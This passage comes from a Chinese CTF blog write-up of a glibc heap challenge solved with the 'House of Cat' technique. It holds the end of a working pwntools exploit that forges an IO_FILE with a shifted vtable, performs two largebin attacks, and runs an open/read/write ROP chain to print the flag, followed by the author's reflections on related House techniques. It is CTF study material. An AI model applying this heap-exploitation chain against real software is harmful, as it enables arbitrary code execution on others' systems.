vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br><span class="line"></span><br><span class="line">flag_addr=heap_base+<span class="number">0x17d0</span></span><br><span class="line">payload1=fake_IO_FILE+p64(flag_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x418</span>,payload1)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#large bin attack stderr poiniter</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rdi_ret, <span class="comment"># close(0)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    close,</span><br><span class="line">    pop_rax_ret, <span class="comment"># sys_open(&#x27;flag&#x27;, 0)</span></span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    flag_addr,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    pop_rdi_ret, <span class="comment"># read(0, heap, 0x100)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    flag_addr + <span class="number">0x200</span>,</span><br><span class="line">    pop_rdx_pop_r12_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    read,</span><br><span class="line">    pop_rdi_ret, <span class="comment"># write(1, heap, 0x100)</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    flag_addr + <span class="number">0x200</span>,</span><br><span class="line">    pop_rdx_pop_r12_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    write</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x430</span>,flat(rop_data))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x450</span>,p64(<span class="number">0</span>)+p64(<span class="number">1</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack topchunk&#x27;s size</span></span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x1370</span>)+p64(heap_base+<span class="number">0x28e0</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">inpwn()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;plz input your cat idx:&#x27;</span>,<span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;plz input your cat size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x450</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>打比赛的时候没有做出来，在学习了 House Of Kiwi，House Of Emma 后，感觉理解这种调用方式了，最核心的技术还是那一点：通过伪造 vtable 的偏移来进行 vtable 函数任意执行</p>
<p>House Of Cat 只需要两次 edit，比 House Of Emma 还少一次，我感觉基于这个思路应该有很多种调用链，但它们大多数都可以被 House Of Cat 替代</p>
<p>如果本题目的漏洞点不是 UAF，而是 off-by-one 的话，可能会更复杂点，但理论上还是可以通过 unsortedbin 遗留的 FD BK 指针来绕过检查，完成 leak 并且进行一次 largebin attack</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">139</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">1.8m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">27:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
